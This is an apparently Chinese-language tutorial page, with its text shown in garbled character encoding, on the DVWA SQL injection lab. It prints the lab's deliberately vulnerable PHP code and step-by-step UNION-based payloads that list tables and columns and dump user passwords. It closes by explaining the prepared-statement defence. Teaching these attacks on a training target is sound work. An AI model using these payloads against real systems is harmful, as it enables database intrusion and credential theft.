<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>ä»€ä¹ˆæ˜¯SQLæ³¨å…¥?</title>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.css">
</head>
<body>
<div class="article-content" data-id="web-sqli">
<div class="intro-article">
<p><span style="color:#51cf66">æ¬¢è¿æ¥åˆ°webæ–¹å‘!</span></p>
<h2>ä»Šå¤©ä»‹ç»ä¸€ä¸‹å…¥é—¨çº§çš„æ¼æ´ <span style="color:#ffd43b">sql injection</span></h2>
<p>é¢˜ç›®æ¥è‡ªdvwaé¶åœºçš„sqliç»ƒä¹ ğŸ˜³</p>
<h1>low level</h1>
<p>æºç :</p>
<pre><code class="language-php">&lt;?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    // Check database
    $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = '$id';&quot;;
    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row[&quot;first_name&quot;];
        $last  = $row[&quot;last_name&quot;];

        // Feedback for end user
        echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;
    }

    mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);
}

?&gt;
</code></pre>
<p>æœ€ç®€å•çš„sqlæ³¨å…¥</p>
<p>ps:ä½ å¯èƒ½éœ€è¦å…ˆäº†è§£ä¸€äº›sqlè¯­æ³•(ä¸è¿‡éå¸¸ç®€å•)</p>
<blockquote>
<p>å…ˆæŒæ¡DELETE SELECT INSERT UPDATE</p>
</blockquote>
<p>å¼€å§‹!</p>
<p>è§‚å¯Ÿåˆ°æ ¸å¿ƒé€»è¾‘:</p>
<blockquote>
<p>SELECT first_name, last_name FROM users WHERE user_id = â€˜$idâ€™;</p>
</blockquote>
<p>ç”¨æˆ·è¾“å…¥ç›´æ¥æ‹¼æ¥åˆ°SQLä¸”æ— è¿‡æ»¤ï¼Œæ— ç±»å‹æ£€æŸ¥</p>
<p>å…ˆè¾“å…¥</p>
<blockquote>
<p>1â€™ OR â€˜1â€™=â€˜1â€™ #</p>
</blockquote>
<p>è¯­å¥å˜ä¸ºuser_id = â€˜1â€™ OR â€˜1â€™=â€˜1â€™ #â€¦(è¢«æ³¨é‡Šæ‰äº†)</p>
<p>1=1æ’çœŸï¼ŒåŠ ä¸Šorçš„é€»è¾‘</p>
<p>è®¡ç®—æœºç›´æ¥å°†è¯¥è¯­å¥åˆ¤å®šä¸ºçœŸå¹¶è¿”å›äº†æ‰€æœ‰çš„ç”¨æˆ·åå­—</p>
<p>å› æ­¤å­˜åœ¨æ³¨å…¥ç‚¹</p>
<p>æ¥ä¸‹æ¥çœ‹ä¸€ä¸‹åŸºæœ¬ä¿¡æ¯</p>
<p>è¾“å…¥</p>
<blockquote>
<p>1â€™ UNION SELECT database(),â€˜aâ€™ #</p>
</blockquote>
<p>è¿”å›dvwa</p>
<p>ps:1â€™é—­åˆå‰é¢è¯­å¥ï¼Œ#æ³¨é‡Šæ‰åç»­è¯­å¥,ä¸­é—´æ‰§è¡Œä»»æ„ä»£ç !</p>
<p>ç„¶åè·å–è¡¨å</p>
<blockquote>
<p>1â€™ UNION SELECT table_name, â€˜aâ€™ FROM information_schema.tables WHERE table_schema=â€˜dvwaâ€™ #</p>
</blockquote>
<p>å¾—åˆ°è¡¨å</p>
<blockquote>
<p>users</p>
</blockquote>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬è·å¾—åˆ—å</p>
<blockquote>
<p>1â€™ UNION SELECT column_name, â€˜aâ€™ FROM information_schema.columns WHERE table_name=â€˜usersâ€™ #</p>
</blockquote>
<p>å¾—åˆ°åˆ—å</p>
<blockquote>
<p>é‡ç‚¹:user password</p>
</blockquote>
<p>æ¥ä¸‹æ¥è¯»å–æ•æ„Ÿä¿¡æ¯</p>
<blockquote>
<p>1â€™ UNION SELECT user,password FROM users #</p>
</blockquote>
<p>æˆåŠŸè·å¾—æ‰€æœ‰ç”¨æˆ·çš„å¯†ç !</p>
<h2>medium level</h2>
<p>æºç </p>
<pre><code class="language-php">&lt;?php

if( isset( $_POST[ 'Submit' ] ) ) {
    // Get input
    $id = $_POST[ 'id' ];

    $id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id);

    $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;;
    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( '&lt;pre&gt;' . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . '&lt;/pre&gt;' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Display values
        $first = $row[&quot;first_name&quot;];
        $last  = $row[&quot;last_name&quot;];

        // Feedback for end user
        echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;
    }

}

// This is used later on in the index.php page
// Setting it here so we can close the database connection in here like in the rest of the source scripts
$query  = &quot;SELECT COUNT(*) FROM users;&quot;;
$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );
$number_of_rows = mysqli_fetch_row( $result )[0];

mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);
?&gt;

</code></pre>
<p>é¢˜ç›®éš¾åº¦ç•¥å¾®å¢åŠ </p>
<p>ç•Œé¢ä¸å†æœ‰è¡¨å•æäº¤</p>
<p>æ”¹ä¸ºäº†ä¸‹æ‹‰é€‰æ‹©(ç°å®è°ä¼šè¿™æ ·ğŸ˜¹ğŸ˜¹)</p>
<p>ä¸è¿‡ä¸å½±å“æˆ‘ä»¬åˆ©ç”¨ğŸ™ˆğŸ™ˆ</p>
<p>è§‚å¯Ÿé¢˜ç›®é€»è¾‘ä¸ºä½¿ç”¨postä¼ é€’id</p>
<p>ä¸”å…³é”®1:</p>
<blockquote>
<p>SELECT first_name, last_name FROM users WHERE user_id = $id;</p>
</blockquote>
<p>å…³é”®2:</p>
<blockquote>
<p>ä½¿ç”¨äº†mysqli_real_escape_string,â€™ &quot;ä¼šè¢«è¿‡æ»¤</p>
</blockquote>
<p>æ—¢ç„¶æ— æ³•è¾“å…¥ä¿¡æ¯</p>
<p>é‚£ä¹ˆè¿™æ—¶å€™ï¼Œå°±è¦æ‹¿å‡ºæˆ‘ä»¬çš„æŠ“åŒ…ç¥å™¨burpsuiteäº†ğŸ˜¡</p>
<p>ä¸‹è½½åœ°å€: <a href="https://portswigger.net/burp/communitydownload">https://portswigger.net/burp/communitydownload</a></p>
<p>æ‰“å¼€proxy</p>
<p>open browser</p>
<p>å…ˆæ‰“å¼€interceptæ¨¡å¼</p>
<p>ä½ ä¼šçœ‹åˆ°</p>
<blockquote>
<p>intercept is on!</p>
</blockquote>
<p>ç„¶åç‚¹å‡»submit</p>
<p>æ‰“å¼€burpsuiteæŸ¥çœ‹æŠ“åŒ…å¾—åˆ°çš„ä¿¡æ¯</p>
<p>ä½ ä¼šçœ‹åˆ°:</p>
<p>POST /vulnerabilities/sqli/?id=1&amp;Submit=Submit HTTP/1.1</p>
<p>Host: localhost:8000(æˆ‘éšä¾¿å¼€çš„ç«¯å£â€¦)</p>
<p>â€¦</p>
<p>id=1&amp;Submit=Submit</p>
<p>å“ˆå“ˆï¼Œåœ¨è¿™é‡Œæ³¨å…¥å°±è¡Œäº†å§ğŸ˜ğŸ˜</p>
<p>åŒç†(æ³¨æ„æ²¡æœ‰â€™çš„é€»è¾‘äº†)</p>
<p>ç›´æ¥æ”¹ä¸º</p>
<blockquote>
<p>id=1 UNION SELECT user,password FROM users #&amp;Submit=Submit</p>
</blockquote>
<p>æˆåŠŸ!ğŸ˜</p>
<h2>high level</h2>
<p>æºç </p>
<pre><code class="language-php">&lt;?php

if( isset( $_SESSION [ 'id' ] ) ) {
    // Get input
    $id = $_SESSION[ 'id' ];

    // Check database
    $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;&quot;;
    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( '&lt;pre&gt;Something went wrong.&lt;/pre&gt;' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row[&quot;first_name&quot;];
        $last  = $row[&quot;last_name&quot;];

        // Feedback for end user
        echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);        
}

?&gt;
</code></pre>
<p>è¿™æ¬¡ä¸çœ‹ä½ çš„idäº†</p>
<blockquote>
<p>ç›´æ¥çœ‹ä½ ä¿®æ”¹çš„$_SESSION[â€˜idâ€™] çš„å€¼</p>
</blockquote>
<p>æ‰€ä»¥æˆ‘ä»¬ç›´æ¥è¿›å…¥change session idçš„åœ°æ–¹</p>
<p>ä¾æ—§burpsuiteæŠ“åŒ…</p>
<p>é¢˜ç›®é€»è¾‘è¿˜æ˜¯</p>
<blockquote>
<p>SELECT first_name, last_name FROM users WHERE user_id = â€˜$idâ€™ LIMIT 1;</p>
</blockquote>
<p>payload</p>
<blockquote>
<p>1â€™ UNION SELECT user,password FROM users #&amp;Submit=Submit</p>
</blockquote>
<p>æˆåŠŸ!ğŸ˜</p>
<h2>impossible level</h2>
<p>æºç </p>
<pre><code class="language-php">&lt;?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $id = $_GET[ 'id' ];

    // Was a number entered?
    if(is_numeric( $id )) {
        // Check the database
        $data = $db-&gt;prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
        $data-&gt;bindParam( ':id', $id, PDO::PARAM_INT );
        $data-&gt;execute();
        $row = $data-&gt;fetch();

        // Make sure only 1 result is returned
        if( $data-&gt;rowCount() == 1 ) {
            // Get values
            $first = $row[ 'first_name' ];
            $last  = $row[ 'last_name' ];

            // Feedback for end user
            echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;
        }
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?&gt;
</code></pre>
<p>okè§‚å¯Ÿè¿™ä¸ªæºç </p>
<p>å‘ç°:</p>
<blockquote>
<p>æ ¹æœ¬ä¸å¯èƒ½èƒ½sqlæ³¨å…¥</p>
</blockquote>
<p>å…¶å®è¿™æ˜¯ä¸€æ¬¡å®‰å…¨æŸ¥è¯¢çš„ç¤ºèŒƒ</p>
<p>å­¦ä¹ äº†æ”»å‡»ï¼Œä¹Ÿè¦å­¦ä¹ å¦‚ä½•é˜²å®ˆ</p>
<p><span style="color:#ff6b6b">ä¸ºä»€ä¹ˆè¿™ä¸ªä»£ç è¿™ä¹ˆå®‰å…¨?</span></p>
<ul>
<li>
<p>CSRF token æ ¡éªŒï¼šä¿®æ”¹è¯·æ±‚éœ€è¦åˆæ³• tokenï¼ˆå‡å°‘å¯ç›´æ¥æ„é€ çš„è¯·æ±‚é¢ï¼‰</p>
</li>
<li>
<p>ç±»å‹æ£€æŸ¥ is_numeric()ï¼šéæ•°å­—è¾“å…¥ç›´æ¥è¢«ä¸¢å¼ƒï¼Œä¸ä¼šè¿›å…¥æŸ¥è¯¢!</p>
</li>
<li>
<p>Prepared statement + bindParam(â€¦, PDO::PARAM_INT)ï¼šå³ä½¿èƒ½æŠŠè¾“å…¥é€è¿›æŸ¥è¯¢ï¼Œä¹Ÿä¼šæŒ‰æ•´å‹ç»‘å®šï¼Œæ— æ³•æŠŠ SQL ç‰‡æ®µæ³¨å…¥è¿›æŸ¥è¯¢ç»“æ„!</p>
</li>
<li>
<p>LIMIT 1 + rowCount checkï¼šé™åˆ¶è¿”å›è¡Œæ•°å¹¶ç¡®è®¤åªæœ‰ 1 è¡Œï¼Œé™ä½ä¿¡æ¯æ³„éœ²é¢ã€‚</p>
</li>
</ul>
<p>ä¼ä¸šçº§å®‰å…¨ä¸­æœ€æ ‡å‡†çš„é˜²å¾¡ğŸ˜ğŸ˜</p>
<h2>æœ€å:</h2>
<p>sqlæ³¨å…¥ä¸æ­¢äºæ­¤</p>
<p>é¢˜ç›®ä¸­å¯èƒ½è¿˜æœ‰å„ç§å„æ ·çš„æ³¨å…¥æ–¹å¼äº¦æˆ–ç»•è¿‡é€»è¾‘</p>
<blockquote>
<p>ç­‰å¾…ç€ä½ è¿™åhackerå»attack!ğŸ˜</p>
</blockquote>
<p>å…¶å®è¿˜æœ‰ä¸€ä¸ªè‡ªåŠ¨åŒ–å·¥å…·å«åšsqlmap</p>
<p>ä¸è¿‡</p>
<p>åªä¼šä½¿ç”¨å·¥å…·æ˜¯ä¸è¡Œçš„(ä½ ä¼šè¢«ç§°ä½œ<em>è„šæœ¬å°å­</em>ğŸ˜„)</p>
<p>æœ€å¥½ç†è§£å…¶åŸç†ğŸ˜ğŸ˜</p>
<h2>å°æ’æ›²</h2>
<p>æœ€åè°ˆè°ˆä¸ªäººçš„ä¸€ç‚¹å°æ„Ÿå—:(å¯ä»¥è·³è¿‡)</p>
<p>åœ¨çŸ­è§†é¢‘å¹³å°æ— æ„çœ‹åˆ°è¿™æ ·ä¸€å¥è¯:</p>
<p>ç°åœ¨åŸºæœ¬éƒ½ä¸ç”¨phpäº†ï¼Œéƒ½è¿‡æ—¶äº†ï¼Œä½ å­¦è¿™äº›å¹²å˜›?</p>
<p>åˆçœ‹æ„Ÿè§‰ä¼¼ä¹è¯´çš„åœ¨ç†</p>
<p>ç»†æ€ï¼Œå®åˆ™ä¸ç„¶</p>
<p>php å¹¶ä¸æ˜¯ web æ¼æ´çš„æœ¬è´¨ã€‚</p>
<p>æ¼æ´ä¸ä¾èµ–å…·ä½“å“ªé—¨<strong>è¯­è¨€</strong>ï¼Œæ¼æ´ä¾èµ–â€œä¸šåŠ¡+äººå†™çš„ä»£ç +æ¶æ„â€ã€‚</p>
<p>å¾€æ›´æ·±ç‚¹è¯´</p>
<p>SQLæ³¨å…¥çš„æœ¬è´¨å…¶å®æ˜¯<strong>è¾“å…¥éªŒè¯é€»è¾‘çš„ç¼ºå¤±</strong></p>
<p>è¿™äº›ä¸œè¥¿åœ¨ goã€nodeã€javaã€pythonã€ruby ä¾æ—§å­˜åœ¨ã€‚</p>
<p>ç°åœ¨æˆ‘ä»¬ç”¨phpè¿™é—¨è¯­è¨€å­¦çš„æ˜¯åº•å±‚é€»è¾‘ä¸å®‰å…¨æ€ç»´ï¼Œåé¢å®Œå…¨èƒ½<strong>è¿ç§»</strong>ã€‚</p>
<p><em><strong>å› æ­¤</strong></em></p>
<p>å®Œå…¨ä¸å¿…ç„¦è™‘æˆ–æ€€ç–‘è‡ªå·±</p>
<blockquote>
<p>all your work will pay off</p>
</blockquote>
<p>that is end~ğŸ˜€</p>
<p>æ„Ÿè°¢é˜…è¯»~ğŸ˜€</p>
</div>
</div>
</body>
</html>